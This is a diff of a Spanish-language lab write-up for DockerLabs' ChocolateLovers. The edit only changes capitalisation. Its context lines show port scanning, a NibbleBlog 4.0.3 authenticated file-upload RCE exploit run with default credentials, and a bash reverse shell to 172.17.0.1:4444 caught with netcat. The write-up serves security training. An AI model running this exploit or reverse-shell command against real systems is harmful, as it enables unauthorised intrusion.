@@ -1,6 +1,6 @@
 ---
-title: DockerLabs - Chocolatelovers
-summary: "Write-up del laboratorio Chocolatelovers de DockerLabs"
+title: DockerLabs - ChocolateLovers
+summary: "Write-up del laboratorio ChocolateLovers de DockerLabs"
 author: elcybercurioso
 date: 2025-11-09
 categories: [Post, DockerLabs]
@@ -14,14 +14,14 @@ published: true
 ## nmap
 
 ```bash
-┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Chocolatelovers]
+┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/ChocolateLovers]
 └─$ nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oG allPorts
 PORT   STATE SERVICE
 80/tcp open  http
 ```
 
 ```bash
-┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Chocolatelovers]
+┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/ChocolateLovers]
 └─$ nmap -sCV -p80 172.17.0.2                              
 PORT   STATE SERVICE VERSION
 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
@@ -56,7 +56,7 @@ La versión de `NibbleBlog` que hay desplegada es la 4.0.3, la cual parece ser v
 Al ejecutar el exploit, nos daremos cuenta de que falla:
 
 ```bash
-┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Chocolatelovers/nibbleblog_4.0.3]
+┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/ChocolateLovers/nibbleblog_4.0.3]
 └─$ python3 nibbleblog_4.0.3.py -t http://172.17.0.2/nibbleblog/admin.php -u admin -p admin -rce whoami
 Nibbleblog 4.0.3 File Upload Authenticated Remote Code Execution
 Loggin in to http://172.17.0.2/nibbleblog/admin.php
@@ -84,7 +84,7 @@ Sin embargo, podemos instalarlo simplemente pinchando en `Install` tras localiza
 Una vez hecho esto, veremos que ahora si que es posible ver la respuesta de los comandos ejecutados:
 
 ```bash
-┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Chocolatelovers/nibbleblog_4.0.3]
+┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/ChocolateLovers/nibbleblog_4.0.3]
 └─$ python3 nibbleblog_4.0.3.py -t http://172.17.0.2/nibbleblog/admin.php -u admin -p admin -rce whoami
 Nibbleblog 4.0.3 File Upload Authenticated Remote Code Execution
 Loggin in to http://172.17.0.2/nibbleblog/admin.php
@@ -97,7 +97,7 @@ www-data
 Dado que ya hemos conseguido ejecutar comandos, procedemos a obtener una reverse shell:
 
 ```bash
-┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Chocolatelovers/nibbleblog_4.0.3]
+┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/ChocolateLovers/nibbleblog_4.0.3]
 └─$ python3 nibbleblog_4.0.3.py -t http://172.17.0.2/nibbleblog/admin.php -u admin -p admin -rce 'bash -c "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1"'
 Nibbleblog 4.0.3 File Upload Authenticated Remote Code Execution
 Loggin in to http://172.17.0.2/nibbleblog/admin.php
@@ -108,7 +108,7 @@ Payload located in http://172.17.0.2/nibbleblog/content/private/plugins/my_image
 Si nos hemos puesto en escucha antes de ejecutar el comando anterior, deberíamos de haber obtenido la conexión:
 
 ```bash
-┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Chocolatelovers]
+┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/ChocolateLovers]
 └─$ nc -nlvp 4444      
 listening on [any] 4444 ...
 connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 45444
